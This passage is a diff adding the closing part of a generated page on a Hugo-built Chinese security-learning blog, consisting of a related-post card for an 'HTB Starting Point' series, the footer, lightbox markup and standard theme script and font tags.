+                <img src="/p/htb-starting-point-%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%97/assets/image-20261104205444073.d9e4fd976e03998d17a7cc2012db183c_hu3527743922139951764.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post HTB Starting Point 入门系列"
+                        
+                        data-hash="md5-2eT9l24DmY0Xp8wgEtsYPA==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HTB Starting Point 入门系列</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2026 Sp1ke
+    </section>
+    
+    <section class="powerby">
+        
+            记录安全学习 <br/>
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.26.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
